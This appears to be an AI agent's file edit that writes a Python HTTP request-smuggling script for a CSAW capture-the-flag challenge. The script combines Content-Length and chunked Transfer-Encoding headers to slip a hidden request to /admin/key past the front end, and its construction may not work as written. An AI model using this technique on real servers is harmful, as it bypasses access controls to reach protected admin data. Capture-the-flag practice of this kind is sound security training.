edit 1:1
import socket

HOST = 'web.chal.csaw.io'
PORT = 80

# Smuggled request to /admin/key
smuggled = "GET /admin/key HTTP/1.1\r\nHost: web.chal.csaw.io\r\n\r\n"

# Outer request with chunked encoding
body = "%x\r\n%s\r\n0\r\n\r\n" % (len(smuggled), smuggled)

req = (
    "POST / HTTP/1.1\r\n"
    "Host: web.chal.csaw.io\r\n"
    "Content-Length: %d\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "%s"
) % (len(body), body)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((HOST, PORT))
s.sendall(req.encode())
data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
except Exception as e:
    pass
s.close()
print(data.decode(errors='replace'))
end_of_edit

